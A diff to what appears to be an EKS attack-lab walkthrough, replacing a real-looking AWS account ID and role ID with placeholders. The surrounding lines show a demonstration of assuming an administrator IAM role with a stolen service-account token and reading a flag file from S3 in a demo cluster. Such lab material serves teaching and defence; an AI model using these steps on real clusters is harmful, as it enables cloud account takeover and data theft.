@@ -20,7 +20,7 @@ The setup script creates a small but realistic two-namespace cluster.
 
 ```
 EKS cluster  holy-splain     (region: us-east-1)
-                                                                       AWS account 241317860001
+                                                                       AWS account 123456789012
                                                                        (your account, not the
                                                                         attacker's)
 +----------------------------------------+
@@ -307,7 +307,7 @@ Our IAM role's trust policy says: federated provider equals the cluster's OIDC i
 
 ```bash
 CREDS_JSON=$(aws sts assume-role-with-web-identity \
-  --role-arn arn:aws:iam::241317860001:role/HolySplainProdDataPipelineAdministrator \
+  --role-arn arn:aws:iam::123456789012:role/HolySplainProdDataPipelineAdministrator \
   --role-session-name holy-splain-node-escape \
   --web-identity-token "$STOLEN" \
   --duration-seconds 900)
@@ -323,9 +323,9 @@ The closing `get-caller-identity` confirms whose creds we just exported. It retu
 
 ```json
 {
-  "UserId": "AROATQL5KKKQRTUBHIAIL:holy-splain-node-escape",
-  "Account": "241317860001",
-  "Arn": "arn:aws:sts::241317860001:assumed-role/HolySplainProdDataPipelineAdministrator/holy-splain-node-escape"
+  "UserId": "AROAEXAMPLEROLEID0001:holy-splain-node-escape",
+  "Account": "123456789012",
+  "Arn": "arn:aws:sts::123456789012:assumed-role/HolySplainProdDataPipelineAdministrator/holy-splain-node-escape"
 }
 ```
 
@@ -342,7 +342,7 @@ The role's permissions policy in our demo grants only `s3:GetObject` on the demo
 The minimum demonstration is reading the demo bucket's flag.
 
 ```bash
-aws s3 cp s3://kubesplaining-holysplain-secrets-241317860001-us-east-1/flag.txt -
+aws s3 cp s3://kubesplaining-holysplain-secrets-123456789012-us-east-1/flag.txt -
 ```
 
 Output:
